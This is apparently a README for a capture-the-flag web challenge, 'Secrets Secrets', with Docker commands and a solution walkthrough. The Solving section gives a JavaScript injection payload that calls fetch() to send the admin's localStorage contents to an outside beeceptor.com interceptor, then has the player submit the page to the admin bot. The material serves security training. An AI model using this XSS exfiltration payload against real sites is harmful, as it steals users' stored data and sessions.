# Secrets Secrets

*NOTE:* This challenge REQUIRES source code to solve.

Create a secret post by injecting javascript allows users to look into the localStorage of the admin.

## Building

```
docker build . -t secrets_secrets
```

## Running

```
docker run -p 5678:5678 -p 5679:5679 -it secrets_secrets
```

## Solving

- Go to the challenge website on port 5679 with adding a post
- Notice that you can inject html/javascript into the view website
- Using the inspect element tools one of the solutions to inject is:
```
";}); fetch("https://greyhat.free.beeceptor.com?q=" + localStorage.previous); (() =>{hello = "
```
- ^^^ Uses beeceptor a free to use http interceptor, there are several alternatives
- Then take the generated url from the view page and submit that url to the admin
- The admin will view the page and will access the website with their previous note being the flag
- Beeceptor will have a url to the flag's secret page after the `?q=` or in the params, visit the page and get the flag 